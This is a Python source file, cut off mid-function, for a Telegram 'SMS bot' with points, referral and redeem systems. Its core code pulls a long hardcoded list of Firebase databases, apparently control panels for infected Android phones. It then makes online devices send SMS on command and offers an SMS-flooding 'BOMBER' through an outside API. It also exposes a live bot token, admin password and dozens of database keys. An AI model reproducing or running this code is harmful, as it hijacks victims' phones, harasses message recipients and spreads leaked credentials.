import telebot
import requests
import json
import time
import os
import random
import string
from datetime import datetime, timedelta
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============================================================
#  CONFIG
# ============================================================
BOT_TOKEN = "8875207437:AAEOFpkmBV6mK7ZbEHKoJdy3J8EyOnH6Ux0"
ADMIN_PASSWORD = "#patell4545"
BOT_USERNAME = "Indian_custom_sms_bot"
FORCE_CHANNEL = "@modxpatel"
BOMBER_API = "https://all-sigma-pad-api-damo-5-day.vercel.app/api?key=RAJAN99&type=BOMBER&term={phone}|{count}"

bot = telebot.TeleBot(BOT_TOKEN)

# ============================================================
#  JSON FILE HANDLING
# ============================================================
def load_json(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_json(filename, data):
    with open(filename, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

# ============================================================
#  INITIALIZE JSON FILES
# ============================================================
def init_files():
    files = ['user.json', 'firebase.json', 'redeem.json', 'ban.json', 'unban.json', 'sms.json']
    for file in files:
        if not os.path.exists(file):
            save_json(file, {})

init_files()

# ============================================================
#  FIREBASE CONFIG - SAB PROJECTS EK SAATH
# ============================================================
def load_firebase_config():
    data = load_json('firebase.json')
    if not data:
        projects = [
            # ===== PEHLE WALE 7 PROJECTS =====
            {"url": "https://goat-100a8-default-rtdb.firebaseio.com", "key": "patel"},
            {"url": "https://me03-4e321-default-rtdb.firebaseio.com", "key": "patel"},
            {"url": "https://shilpa-e712a-default-rtdb.firebaseio.com", "key": "patel"},
            {"url": "https://xxx-kumar-default-rtdb.firebaseio.com", "key": "patel"},
            {"url": "https://kingu-2dbb9-default-rtdb.firebaseio.com", "key": "patel"},
            {"url": "https://raj-parsonal-default-rtdb.firebaseio.com", "key": "patel"},
            {"url": "https://styles-girl-d7617-default-rtdb.firebaseio.com", "key": "patel"},
            
            # ===== NAYE PROJECTS (68 PROJECTS) =====
            {"url": "https://tinnm88-b7db5-default-rtdb.firebaseio.com", "key": "AIzaSyBDanswTNTm4-E7v4wCX-_WsQ0A8ZaDIf4"},
            {"url": "https://e9turnament1-default-rtdb.firebaseio.com", "key": "AIzaSyDJrFRMMpcX0rCZZb23t-Mps_U_giS1ZiM"},
            {"url": "https://raaz-5287d-default-rtdb.firebaseio.com", "key": "Hebdixndd"},
            {"url": "https://apkpure-6eb6a-default-rtdb.firebaseio.com", "key": "AIzaSyCA3ms8hASuy0fgaR5fpJI75dClkeCxomE"},
            {"url": "https://e14turnament2-default-rtdb.firebaseio.com", "key": "AIzaSyBIjWavyJ8SHeZ14iLesy4bAOr8EPGtB8"},
            {"url": "https://bossuun-default-rtdb.firebaseio.com", "key": "AIzaSyBfQobM5HmnK6khogyF4ytOX7E9N0e_lAQ"},
            {"url": "https://jsjsjdj-7f0d1-default-rtdb.firebaseio.com", "key": "AIzaSyCPJL-eDjeLSamlXrLz44ONBeVUgSTVxzU"},
            {"url": "https://rahul-54fe9-default-rtdb.firebaseio.com", "key": "AIzaSyB7QRdVFsu_hnKv_-u1RpAAnTVyO4Fz-sM"},
            {"url": "https://runjun-master-panel-default-rtdb.firebaseio.com", "key": "AIzaSyBawSxrwOxhTzKzCv20-LkcoxK7n6y4msc"},
            {"url": "https://gsjjshdbs-default-rtdb.firebaseio.com", "key": "AIzaSyAMx2OMDpLoa9GJ343hUG2z1F2SCnede9g"},
            {"url": "https://apkdriod-f6fb9-default-rtdb.firebaseio.com", "key": "AIzaSyBVDnh3vYAH9lnPnrYGF1Vk7Rg030UE2A"},
            {"url": "https://fir-1fa16-default-rtdb.firebaseio.com", "key": "AIzaSyCTEGsutg53vY2cdFfxPRdYkniPJWPgwMA"},
            {"url": "https://newspreding-default-rtdb.firebaseio.com", "key": "AIzaSyDswt99EDO-HdTmG3U9tARSElpki13JWFo"},
            {"url": "https://privatesok-59944-default-rtdb.firebaseio.com", "key": "AIzaSyDLSgw5MHFG1lerZgcFe-7kSzQ78vHaHME"},
            {"url": "https://e5turnament2-default-rtdb.firebaseio.com", "key": "AIzaSyDj9pR0AaoGKI lje-0E6QQ5hUZH-3gh-_Q"},
            {"url": "https://risho-d4c66-default-rtdb.firebaseio.com", "key": "AIzaSyBkccFcYJ-FcClxHMztRAyropULYvxKsW0"},
            {"url": "https://fir-27c9e-default-rtdb.firebaseio.com", "key": "AIzaSyA7EOpeZLDxpAYPcS2_nb1JzZK4ZNCgp6Q"},
            {"url": "https://singhaana-6f199-default-rtdb.firebaseio.com", "key": "AIzaSyD-1Gvt2cmr0mv1xoK4V9vtjVMXyJZLAvg"},
            {"url": "https://dogla-de225-default-rtdb.firebaseio.com", "key": "AIzaSyAu4Gv_EqcU0vjCO5DBoVeSu13-2RXSR0I"},
            {"url": "https://ravi-23776-default-rtdb.firebaseio.com", "key": "AIzaSyAhiU2F5EvDSq7K30pDGVUO378gdiPeYbM"},
            {"url": "https://vibe-d238e-default-rtdb.firebaseio.com", "key": "AIzaSyC6xgT8a_WWY06l_bwD4g5XIEmah6F87xg"},
            {"url": "https://painislv-default-rtdb.firebaseio.com", "key": "AIzaSyCq7jDPgVCae36q7F5HbdUEB9FbluM8pDs"},
            {"url": "https://rahais-default-rtdb.firebaseio.com", "key": "AIzaSyCERhzcR3bqlK9yi-lY5P8CbC_mX6nAy8Y"},
            {"url": "https://customer-1b7ca-default-rtdb.firebaseio.com", "key": ""},
            {"url": "https://ritesh0001-ea582-default-rtdb.firebaseio.com", "key": "AIzaSyDbWz9viiCY6VnWHP0-Wo6TWZwCwu7Meg"},
            {"url": "https://mafiaaaa2oppp-default-rtdb.firebaseio.com", "key": "AIzaSyBl3179G60c2LzYPrbkp4tmuRKK_7H0_0g"},
            {"url": "https://sep12-aea6d-default-rtdb.firebaseio.com", "key": "AIzaSyC7XwfQcBJW8grYxZmahW36OaiPsHNrh6M"},
            {"url": "https://apkdriod-default-rtdb.firebaseio.com", "key": "AIzaSyDHdyW-rPI-77aq4G8I820Z0Sl4wtdFeBX4"},
            {"url": "https://bank-e-kyc-default-rtdb.firebaseio.com", "key": "AIzaSyDhmaTgotfymhkH-Ir0EHC_B1imQqzM3Iw"},
            {"url": "https://aaeop-2fe3b-default-rtdb.firebaseio.com", "key": "AIzaSyDbWz9viiCY6VnWHP0-Wo6TWZwCwu7Meg"},
            {"url": "https://rtomumbai-bc919-default-rtdb.firebaseio.com", "key": "Fire"},
            {"url": "https://jpicku-47790-default-rtdb.firebaseio.com", "key": "Akku"},
            {"url": "https://simadevi-f42fc-default-rtdb.firebaseio.com", "key": "Hitu"},
            {"url": "https://rto3-53dc7-default-rtdb.firebaseio.com", "key": "AIzaSyB2CXSlxvGedJYIcVVbZWt601QNGEUb_78"},
            {"url": "https://simadevi-f42fc-default-rtdb.firebaseio.com", "key": "AIzaSyBkccFcYJ-FcClxHMztRAyropULYvxKsW0"},
            {"url": "https://paisa-8e4f4-default-rtdb.firebaseio.com", "key": "Hh"},
            {"url": "https://customer-support-12e40-default-rtdb.firebaseio.com", "key": "Hh"},
            {"url": "https://project-f2fd6-default-rtdb.firebaseio.com", "key": ""},
            {"url": "https://rajabhaya-default-rtdb.firebaseio.com", "key": ""},
            {"url": "https://vdgsh-623ed-default-rtdb.firebaseio.com", "key": ""},
            {"url": "https://rajakk-80ecd-default-rtdb.firebaseio.com", "key": ""},
            {"url": "https://miyakhalifa-143d5-default-rtdb.firebaseio.com", "key": ""},
            {"url": "https://maxbhai-b8d3a-default-rtdb.firebaseio.com", "key": ""},
            {"url": "https://sudhir-suexs-seox-default-rtdb.firebaseio.com", "key": ""},
            {"url": "https://dhumm-90a53-default-rtdb.firebaseio.com", "key": ""},
            {"url": "https://dharmesh-panel-default-rtdb.firebaseio.com", "key": ""},
            {"url": "https://shadow-f9cd3-default-rtdb.firebaseio.com", "key": ""},
            {"url": "https://ahisjija-default-rtdb.firebaseio.com", "key": ""},
            {"url": "https://abhiyogi-8b07e-default-rtdb.firebaseio.com", "key": ""},
            {"url": "https://joks-98a44-default-rtdb.firebaseio.com", "key": ""},
            {"url": "https://suman-95a0a-default-rtdb.firebaseio.com", "key": ""},
            {"url": "https://money-ace2c-default-rtdb.firebaseio.com", "key": ""},
            {"url": "https://gopi-4ba85-default-rtdb.firebaseio.com", "key": ""},
            {"url": "https://sala-a92c9-default-rtdb.firebaseio.com", "key": ""},
            {"url": "https://lalit-847ca-default-rtdb.firebaseio.com", "key": ""},
            {"url": "https://afroar-66af-default-rtdb.firebaseio.com", "key": ""},
            {"url": "https://rahul-fd65f-default-rtdb.firebaseio.com", "key": ""},
            {"url": "https://jsisbueve-default-rtdb.firebaseio.com", "key": ""},
            {"url": "https://ramesh-67a2b-default-rtdb.firebaseio.com", "key": "ramesh-67a2b@d1"},
            {"url": "https://ppoi02-default-rtdb.firebaseio.com", "key": "ppoi02@d1"},
            {"url": "https://faak-9cb47-default-rtdb.firebaseio.com", "key": "faak-9cb47@d1"},
            {"url": "https://bulbul8084-9a5df-default-rtdb.firebaseio.com", "key": "bulbul8084-9a5df@d1"},
            {"url": "https://mpariwhan-default-rtdb.firebaseio.com", "key": "mpariwha n@d1"},
        ]
        data = {'projects': projects}
        save_json('firebase.json', data)
    return data

# ============================================================
#  GET ONLINE DEVICES - SAB FIREBASE SE
# ============================================================
def get_all_online_devices():
    config = load_json('firebase.json')
    all_devices = []
    
    for project in config.get('projects', []):
        try:
            url = f"{project['url']}/clients.json"
            if project.get('key'):
                url += f"?auth={project['key']}"
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                data = response.json()
                if data:
                    for device_id, device in data.items():
                        status = device.get('status')
                        is_online = False
                        if isinstance(status, bool):
                            is_online = status
                        elif isinstance(status, str):
                            is_online = status.lower() in ['online', 'true']
                        elif isinstance(status, (int, float)):
                            is_online = bool(status)
                        if is_online:
                            all_devices.append({
                                'id': device_id,
                                'name': device.get('name') or device.get('deviceName') or device_id[:10],
                                'project_url': project['url'],
                                'project_key': project.get('key', '')
                            })
        except:
            continue
    
    return all_devices

# ============================================================
#  SEND SMS VIA DEVICE
# ============================================================
def send_sms_via_device(device, phone, message):
    try:
        url = f"{device['project_url']}/clients/{device['id']}/webhookEvent.json"
        if device.get('project_key'):
            url += f"?auth={device['project_key']}"
        data = {
            'sendSms': {
                'from': 1,
                'to': phone,
                'message': message,
                'timestamp': int(time.time() * 1000),
                'isSended': False
            }
        }
        response = requests.put(url, json=data, timeout=5)
        return response.status_code == 200
    except:
        return False

# ============================================================
#  SMS SENDING - SAB ONLINE DEVICES USE KAREGA
# ============================================================
def send_multiple_sms(phone, message, count, user_id):
    devices = get_all_online_devices()
    
    if not devices:
        return False, "❌ No online devices found!", 0, 0
    
    success_count = 0
    failed_count = 0
    
    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = []
        for i in range(count):
            device = devices[i % len(devices)]
            future = executor.submit(send_sms_via_device, device, phone, message)
            futures.append(future)
        
        for future in as_completed(futures):
            if future.result():
                success_count += 1
            else:
                failed_count += 1
    
    sms_data = load_json('sms.json')
    if str(user_id) not in sms_data:
        sms_data[str(user_id)] = []
    sms_data[str(user_id)].append({
        'phone': phone,
        'message': message[:100],
        'requested': count,
        'actual_sent': success_count,
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    })
    save_json('sms.json', sms_data)
    
    user = get_user_data(user_id)
    user['sms_count'] = user.get('sms_count', 0) + success_count
    save_user_data(user_id, user)
    
    return True, "", success_count, failed_count

# ============================================================
#  BOMBER API CALL
# ============================================================
def call_bomber_api(phone, count, user_id):
    try:
        url = f"https://all-sigma-pad-api-damo-5-day.vercel.app/api?key=RAJAN99&type=BOMBER&term={phone}|{count}"
        response = requests.get(url, timeout=30)
        
        sms_data = load_json('sms.json')
        if str(user_id) not in sms_data:
            sms_data[str(user_id)] = []
        sms_data[str(user_id)].append({
            'type': 'BOMBER',
            'phone': phone,
            'count': count,
            'status': '✅ Sent' if response.status_code == 200 else '❌ Failed',
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        })
        save_json('sms.json', sms_data)
        
        if response.status_code == 200:
            return True, response.json()
        return False, response.text
    except Exception as e:
        sms_data = load_json('sms.json')
        if str(user_id) not in sms_data:
            sms_data[str(user_id)] = []
        sms_data[str(user_id)].append({
            'type': 'BOMBER',
            'phone': phone,
            'count': count,
            'status': '❌ Failed',
            'error': str(e),
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        })
        save_json('sms.json', sms_data)
        return False, str(e)

# ============================================================
#  USER DATA
# ============================================================
def get_user_data(user_id):
    data = load_json('user.json')
    if str(user_id) not in data:
        data[str(user_id)] = {
            'name': '',
            'username': '',
            'points': 100,
            'refer_code': None,
            'referred_by': None,
            'sms_count': 0,
            'join_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'banned': False
        }
        save_json('user.json', data)
    return data[str(user_id)]

def save_user_data(user_id, user_info):
    data = load_json('user.json')
    data[str(user_id)] = user_info
    save_json('user.json', data)

def get_user_points(user_id):
    user = get_user_data(user_id)
    return user.get('points', 100)

def add_points(user_id, points):
    user = get_user_data(user_id)
    user['points'] = user.get('points', 100) + points
    save_user_data(user_id, user)
    return user['points']

def deduct_points(user_id, points):
    user = get_user_data(user_id)
    if user.get('points', 100) >= points:
        user['points'] = user.get('points', 100) - points
        save_user_data(user_id, user)
        return True
    return False

# ============================================================
#  REDEEM SYSTEM
# ============================================================
def generate_redeem_code(amount, max_users):
    redeem_data = load_json('redeem.json')
    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    redeem_data[code] = {
        'amount': amount,
        'max_users': max_users,
        'used_count': 0,
        'used_by': [],
        'created_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'active': True
    }
    save_json('redeem.json', redeem_data)
    return code

def use_redeem_code(user_id, code):
    redeem_data = load_json('redeem.json')
    if code not in redeem_data:
        return False, "❌ Invalid redeem code!"
    if not redeem_data[code]['active']:
        return False, "❌ Code expired!"
    
    used_by = redeem_data[code]['used_by']
    for user in used_by:
        if isinstance(user, dict) and str(user.get('user_id')) == str(user_id):
            return False, "❌ You already used this code!"
        elif str(user) == str(user_id):
            return False, "❌ You already used this code!"
    
    if redeem_data[code]['used_count'] >= redeem_data[code]['max_users']:
        return False, "❌ Code limit reached!"
    
    amount = redeem_data[code]['amount']
    add_points(user_id, amount)
    
    user_info = get_user_data(user_id)
    name = user_info.get('name', 'Unknown')
    username = user_info.get('username', 'NoUsername')
    
    redeem_data[code]['used_by'].append({
        'user_id': str(user_id),
        'name': name,
        'username': username
    })
    redeem_data[code]['used_count'] += 1
    
    if redeem_data[code]['used_count'] >= redeem_data[code]['max_users']:
        redeem_data[code]['active'] = False
    
    save_json('redeem.json', redeem_data)
    return True, f"✅ Redeemed {amount} points!"

# ============================================================
#  REFERRAL
# ============================================================
referral_used = {}

def check_referral_used(user_id):
    if str(user_id) in referral_used:
        return True
    return False

def mark_referral_used(user_id):
    referral_used[str(user_id)] = True

# ============================================================
#  CHECK FORCE JOIN
# ============================================================
def check_force_join(user_id):
    try:
        member = bot.get_chat_member(FORCE_CHANNEL, user_id)
        return member.status not in ['left', 'kicked']
    except:
        return False

# ============================================================
#  SEND BLOCKQUOTE MESSAGE
# ============================================================
def send_block(chat_id, text, reply_markup=None):
    try:
        bot.send_message(chat_id, f"<blockquote>{text}</blockquote>", parse_mode='HTML', reply_markup=reply_markup)
    except:
        bot.send_message(chat_id, text, reply_markup=reply_markup)

# ============================================================
#  KEYBOARDS
# ============================================================
def user_keyboard():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        KeyboardButton("📨 SEND SMS"),
        KeyboardButton("💣 BOMBER")
    )
    markup.add(
        KeyboardButton("👥 REFER"),
        KeyboardButton("👤 ACCOUNT")
    )
    markup.add(
        KeyboardButton("🎁 REDEEM"),
        KeyboardButton("❓ HELP")
    )
    return markup

def admin_keyboard():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        KeyboardButton("🚫 BAN"),
        KeyboardButton("✅ UNBAN")
    )
    markup.add(
        KeyboardButton("📢 BROADCAST"),
        KeyboardButton("🎁 GEN REDEEM")
    )
    markup.add(
        KeyboardButton("➕ ADD POINTS"),
        KeyboardButton("🎁 REDEEM STATUS")
    )
    markup.add(
        KeyboardButton("📁 ALL FILES"),
        KeyboardButton("📊 ONLINE DEVICES")
    )
    markup.add(
        KeyboardButton("🚪 EXIT")
    )
    return markup

# ============================================================
#  ADMIN STATE
# ============================================================
admin_state = {}
admin_session = {}

# ============================================================
#  START COMMAND
# ============================================================
@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.chat.id
    user_name = message.from_user.first_name or "User"
    username = message.from_user.username or "NoUsername"
    
    if not check_force_join(user_id):
        send_block(
            user_id,
            f"⚠️ JOIN REQUIRED\n\n👋 Welcome {user_name}!\n\nPlease join our channel:\n📢 {FORCE_CHANNEL}\n\nAfter joining, send /start again."
        )
        return
    
    ban_data = load_json('ban.json')
    if str(user_id) in ban_data:
        send_block(user_id, "🚫 You are banned!")
        return
    
    if message.text and 'ref_' in message.text and not check_referral_used(user_id):
        try:
            ref_user_id = int(message.text.split('ref_')[1].strip())
            if ref_user_id != user_id:
                user_data = load_json('user.json')
                if str(ref_user_id) in user_data:
                    add_points(ref_user_id, 100)
                    mark_referral_used(user_id)
                    send_block(ref_user_id, f"👥 New user joined using your referral!\n+100 points added!")
        except:
            pass
    
    user = get_user_data(user_id)
    user['name'] = user_name
    user['username'] = username
    save_user_data(user_id, user)
    
    points = user.get('points', 100)
    
    welcome_msg = f"""
☠️ WELCOME ☠️

👋 Welcome {user_name}!

𝙏𝙝𝙞𝙨 𝙞𝙨 𝙈𝙊𝘿 𝙓 𝙋𝘼𝙏𝙀𝙇 𝙎𝙈𝙎 𝘽𝙊𝙏
🔞 𝙐𝙨𝙚 𝙖𝙩 𝙮𝙤𝙪𝙧 𝙤𝙬𝙣 𝙧𝙞𝙨𝙠!

💰 Points: {points}
👥 Referral: +100 Points

<blockquote>Select an option below</blockquote>
"""
    send_block(
        user_id,
        welcome_msg,
        reply_markup=user_keyboard()
    )

# ============================================================
#  ADMIN COMMAND - PASSWORD ONLY
# ============================================================
@bot.message_handler(commands=['admin'])
def admin_command(message):
    user_id = message.chat.id
    
    admin_session[user_id] = {'step': 'password'}
    send_block(
        user_id,
        "🔐 ADMIN PANEL\n\n<blockquote>Enter password:</blockquote>"
    )

@bot.message_handler(func=lambda message: message.chat.id in admin_session)
def admin_password_check(message):
    user_id = message.chat.id
    text = message.text.strip()
    
    if text == ADMIN_PASSWORD:
        del admin_session[user_id]
        send_block(
            user_id,
            "✅ ACCESS GRANTED\n\n<blockquote>Select an option:</blockquote>",
            reply_markup=admin_keyboard()
        )
    elif text == '/cancel':
        del admin_session[user_id]
        send_block(user_id, "❌ Cancelled.")
    else:
        send_block(user_id, "❌ Wrong Password! Try again or /cancel")

# ============================================================
#  ADMIN HANDLER
# ============================================================
@bot.message_handler(func=lambda message: message.text in ["🚫 BAN", "✅ UNBAN", "📢 BROADCAST", "🎁 GEN REDEEM", "➕ ADD POINTS", "🎁 REDEEM STATUS", "📁 ALL FILES", "📊 ONLINE DEVICES", "🚪 EXIT"])
def admin_handler(message):
    chat_id = message.chat.id
    text = message.text
    
    if chat_id in admin_session:
        send_block(chat_id, "❌ Please complete admin login first!")
        return
    
    if text == "🚪 EXIT":
        user = get_user_data(chat_id)
        points = user.get('points', 100)
        welcome_msg = f"""
☠️ WELCOME BACK ☠️

👋 Welcome Admin!

💰 Points: {points}

<blockquote>Select an option below</blockquote>
"""
        send_block(chat_id, welcome_msg, reply_markup=user_keyboard())
        return
    
    if text == "🚫 BAN":
        admin_ban(chat_id)
    elif text == "✅ UNBAN":
        admin_unban(chat_id)
    elif text == "📢 BROADCAST":
        admin_broadcast(chat_id)
    elif text == "🎁 GEN REDEEM":
        admin_gen_redeem(chat_id)
    elif text == "➕ ADD POINTS":
        admin_add_points(chat_id)
    elif text == "🎁 REDEEM STATUS":
        admin_redeem_status(chat_id)
    elif text == "📁 ALL FILES":
        admin_all_files(chat_id)
    elif text == "📊 ONLINE DEVICES":
        admin_online_devices(chat_id)

# ============================================================
#  ADMIN - ADD/REMOVE POINTS
# ============================================================
def admin_add_points(chat_id):
    admin_state[chat_id] = {'step': 'add_points_user'}
    send_block(
        chat_id,
        "➕ *ADD/REMOVE POINTS*\n\n"
        "📌 Send user ID:\n"
        "Example: `8682384647`\n\n"
        "_Type /cancel to cancel_"
    )

@bot.message_handler(func=lambda message: message.chat.id in admin_state and admin_state[message.chat.id].get('step') == 'add_points_user')
def admin_add_points_user(message):
    chat_id = message.chat.id
    text = message.text.strip()
    
    if text == '/cancel':
        del admin_state[chat_id]
        send_block(chat_id, "❌ Cancelled.", reply_markup=admin_keyboard())
        return
    
    try:
        user_id = int(text)
        user_data = load_json('user.json')
        if str(user_id) not in user_data:
            send_block(chat_id, f"❌ User `{user_id}` not found!\n\nSend again or /cancel")
            return
        
        admin_state[chat_id]['target_user'] = str(user_id)
        admin_state[chat_id]['step'] = 'add_points_amount'
        
        user_info = user_data[str(user_id)]
        current_points = user_info.get('points', 0)
        name = user_info.get('name', 'Unknown')
        username = user_info.get('username', 'NoUsername')
        
        send_block(
            chat_id,
            f"👤 *User Found*\n\n"
            f"Name: {name}\n"
            f"Username: @{username}\n"
            f"ID: `{user_id}`\n"
            f"💰 Current Points: {current_points}\n\n"
            f"📌 Enter points to add (positive) or remove (negative):\n"
            f"Example: `+50` or `-20`\n\n"
            f"_Type /cancel to cancel_"
        )
    except:
        send_block(chat_id, "❌ Invalid user ID! Send a number or /cancel")

@bot.message_handler(func=lambda message: message.chat.id in admin_state and admin_state[message.chat.id].get('step') == 'add_points_amount')
def admin_add_points_amount(message):
    chat_id = message.chat.id
    text = message.text.strip()
    
    if text == '/cancel':
        del admin_state[chat_id]
        send_block(chat_id, "❌ Cancelled.", reply_markup=admin_keyboard())
        return
    
    try:
        points = int(text)
        target_user = admin_state[chat_id]['target_user']
        
        user_data = load_json('user.json')
        old_points = user_data[target_user].get('points', 0)
        user_data[target_user]['points'] = old_points + points
        save_json('user.json', user_data)
        
        name = user_data[target_user].get('name', 'Unknown')
        username = user_data[target_user].get('username', 'NoUsername')
        
        action = "Added" if points > 0 else "Removed"
        
        send_block(
            chat_id,
            f"✅ *Points Updated!*\n\n"
            f"👤 User: {name} (@{username})\n"
            f"ID: `{target_user}`\n"
            f"{action}: {abs(points)} points\n"
            f"💰 Previous: {old_points}\n"
            f"💰 New: {user_data[target_user]['points']}\n\n"
            f"<blockquote>Points updated successfully!</blockquote>",
            reply_markup=admin_keyboard()
        )
        
        try:
            bot.send_message(
                int(target_user),
                f"🔔 *Points Updated!*\n\n"
                f"{action}: {abs(points)} points\n"
                f"💰 New Balance: {user_data[target_user]['points']}\n\n"
                f"_Admin updated your points._",
                parse_mode='Markdown'
            )
        except:
            pass
        
        del admin_state[chat_id]
        
    except ValueError:
        send_block(chat_id, "❌ Invalid amount! Send a number like `+50` or `-20`\n\nSend again or /cancel")

# ============================================================
#  ADMIN - GENERATE REDEEM
# ============================================================
def admin_gen_redeem(chat_id):
    admin_state[chat_id] = {'step': 'amount'}
    send_block(
        chat_id,
        "🎁 REDEEM CODE\n\n<blockquote>Enter points amount:</blockquote>"
    )

@bot.message_handler(func=lambda message: message.chat.id in admin_state and admin_state[message.chat.id].get('step') == 'amount')
def admin_gen_redeem_amount(message):
    chat_id = message.chat.id
    text = message.text.strip()
    
    if text == '/cancel':
        del admin_state[chat_id]
        send_block(chat_id, "❌ Cancelled.", reply_markup=admin_keyboard())
        return
    
    try:
        amount = int(text)
        if amount <= 0:
            raise ValueError
        admin_state[chat_id]['amount'] = amount
        admin_state[chat_id]['step'] = 'users'
        send_block(
            chat_id,
            f"💰 Amount: {amount} points\n\n<blockquote>How many users can use this code? (1-1000):</blockquote>"
        )
    except:
        send_block(chat_id, "❌ Invalid amount! Send a number:")

@bot.message_handler(func=lambda message: message.chat.id in admin_state and admin_state[message.chat.id].get('step') == 'users')
def admin_gen_redeem_users(message):
    chat_id = message.chat.id
    text = message.text.strip()
    
    if text == '/cancel':
        del admin_state[chat_id]
        send_block(chat_id, "❌ Cancelled.", reply_markup=admin_keyboard())
        return
    
    try:
        max_users = int(text)
        if max_users <= 0 or max_users > 1000:
            raise ValueError
        amount = admin_state[chat_id]['amount']
        
        code = generate_redeem_code(amount, max_users)
        
        send_block(
            chat_id,
            f"✅ REDEEM CODE\n\n🔑 Code: `{code}`\n💰 Amount: {amount} points\n👥 Max Users: {max_users}\n\n<blockquote>Share this code with users!</blockquote>",
            reply_markup=admin_keyboard()
        )
        del admin_state[chat_id]
    except:
        send_block(chat_id, "❌ Invalid number! Send 1-1000:")

# ============================================================
#  ADMIN - REDEEM STATUS
# ============================================================
def admin_redeem_status(chat_id):
    redeem_data = load_json('redeem.json')
    
    if not redeem_data:
        send_block(chat_id, "📭 No redeem codes generated yet!", reply_markup=admin_keyboard())
        return
    
    msg = "🎁 *REDEEM CODES*\n\n"
    
    for code, data in redeem_data.items():
        status = "🟢 Active" if data['active'] else "🔴 Expired"
        msg += f"🔑 Code: `{code}`\n"
        msg += f"💰 Amount: {data['amount']} points\n"
        msg += f"👥 Used: {data['used_count']}/{data['max_users']}\n"
        msg += f"📊 Status: {status}\n"
        
        if data['used_by']:
            msg += "👤 *Users:*\n"
            for user in data['used_by']:
                if isinstance(user, dict):
                    msg += f"   • {user.get('name', 'Unknown')} (@{user.get('username', 'N/A')}) - ID: {user.get('user_id')}\n"
                else:
                    msg += f"   • {user}\n"
        msg += "\n"
    
    send_block(chat_id, msg[:4000], reply_markup=admin_keyboard())

# ============================================================
#  ADMIN - BAN
# ============================================================
def admin_ban(chat_id):
    send_block(chat_id, "🚫 BAN USER\n\n<blockquote>Send user ID:</blockquote>")
    bot.register_next_step_handler_by_chat_id(chat_id, admin_ban_user)

def admin_ban_user(message):
    chat_id = message.chat.id
    
    try:
        user_id = int(message.text.strip())
    except:
        send_block(chat_id, "❌ Invalid ID!", reply_markup=admin_keyboard())
        return
    
    ban_data = load_json('ban.json')
    ban_data[str(user_id)] = {
        'banned_by': chat_id,
        'banned_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    save_json('ban.json', ban_data)
    
    send_block(chat_id, f"✅ User {user_id} banned!", reply_markup=admin_keyboard())

# ============================================================
#  ADMIN - UNBAN
# ============================================================
def admin_unban(chat_id):
    send_block(chat_id, "✅ UNBAN USER\n\n<blockquote>Send user ID:</blockquote>")
    bot.register_next_step_handler_by_chat_id(chat_id, admin_unban_user)

def admin_unban_user(message):
    chat_id = message.chat.id
    
    try:
        user_id = int(message.text.strip())
    except:
        send_block(chat_id, "❌ Invalid ID!", reply_markup=admin_keyboard())
        return
    
    ban_data = load_json('ban.json')
    if str(user_id) in ban_data:
        del ban_data[str(user_id)]
        save_json('ban.json', ban_data)
    
    send_block(chat_id, f"✅ User {user_id} unbanned!", reply_markup=admin_keyboard())

# ============================================================
#  ADMIN - BROADCAST
# ============================================================
def admin_broadcast(chat_id):
    send_block(chat_id, "📢 BROADCAST\n\n<blockquote>Send your message:</blockquote>")
    bot.register_next_step_handler_by_chat_id(chat_id, admin_broadcast_send)

def admin_broadcast_send(message):
    chat_id = message.chat.id
    broadcast_text = message.text
    
    users = load_json('user.json')
    sent = 0
    
    for uid in users.keys():
        try:
            send_block(int(uid), f"📢 ANNOUNCEMENT\n\n{broadcast_text}")
            sent += 1
            time.sleep(0.05)
        except:
            continue
    
    send_block(chat_id, f"✅ Broadcast sent to {sent} users!", reply_markup=admin_keyboard())

# ============================================================
#  ADMIN - ALL FILES
# ============================================================
def admin_all_files(chat_id):
    files = ['user.json', 'firebase.json', 'redeem.json', 'ban.json', 'unban.json', 'sms.json']
    msg = "📁 *ALL FILES*\n\n"
    
    for file in files:
        data = load_json(file)
        msg += f"📄 {file}: {len(data)} entries\n"
    
    send_block(chat_id, msg, reply_markup=admin_keyboard())
    
    for file in files:
        try:
            if os.path.exists(file):
                with open(file, 'rb') as f:
                    bot.send_document(chat_id, f, caption=f"📄 {file}")
            else:
                send_block(chat_id, f"❌ {file} not found!")
        except Exception as e:
            send_block(chat_id, f"❌ Error sending {file}: {str(e)}")

# ============================================================
#  ADMIN - ONLINE DEVICES
# ============================================================
def admin_online_devices(chat_id):
    devices = get_all_online_devices()
    
    msg = f"📊 ONLINE DEVICES\n\n🟢 Total Online: {len(devices)}\n\n"
    
    if devices:
        for i, device in enumerate(devices[:20]):
            msg += f"📱 {device['name']}\n"
        if len(devices) > 20:
            msg += f"\n... and {len(devices) - 20} more"
    else:
        msg += "❌ No devices online!"
    
    send_block(chat_id, msg, reply_markup=admin_keyboard())

# ============================================================
#  USER - SEND SMS (50-300) - ULTRA FAST
# ============================================================
@bot.message_handler(func=lambda message: message.text == "📨 SEND SMS")
def send_sms_button(message):
    user_id = message.chat.id
    
    if str(user_id) in load_json('ban.json'):
        send_block(user_id, "🚫 You are banned!")
        return
    
    points = get_user_points(user_id)
    if points < 50:
        send_block(user_id, f"❌ Insufficient points! Need at least 50 points. You have {points}.", reply_markup=user_keyboard())
        return
    
    send_block(
        user_id,
        "📨 SEND SMS\n\n📞 Enter phone number (with +):\nExample: +919876543210\n\n_Type /cancel to cancel_"
    )
    bot.register_next_step_handler_by_chat_id(user_id, user_get_phone)

def user_get_phone(message):
    user_id = message.chat.id
    
    if message.text == '/cancel':
        send_block(user_id, "❌ Cancelled.", reply_markup=user_keyboard())
        return
    
    phone = message.text.strip()
    
